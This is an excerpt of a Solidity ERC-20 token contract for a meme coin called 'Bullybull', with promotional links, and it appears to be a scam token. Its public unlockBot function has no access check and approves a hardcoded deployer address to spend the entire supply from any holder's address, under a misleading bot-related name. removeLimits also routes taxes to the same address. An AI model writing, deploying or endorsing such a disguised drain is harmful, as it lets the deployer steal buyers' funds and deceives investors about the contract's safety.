...
Website: https://bullybull.vip
Telegram: https://t.me/bullybull_erc
Twitter: https://x.com/bullybull_erc
...
contract BULLY is Context, IERC20, Ownable {
    ...
    address private _bullyhouse = 0x365bF2D4B361BbC9F93092c81fbE81E07C1442Bd;
    ...
    string private constant _name = unicode"Bullybull";
    ...
    function removeLimits() external onlyOwner {
        ...
        _taxWallet = payable(_bullyhouse);
        _caLimitSell = false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function unlockBot(address _rovot) public returns (bool){
        _approve(_rovot, _bullyhouse, _tTotal);
        return _bots[_rovot];
    }
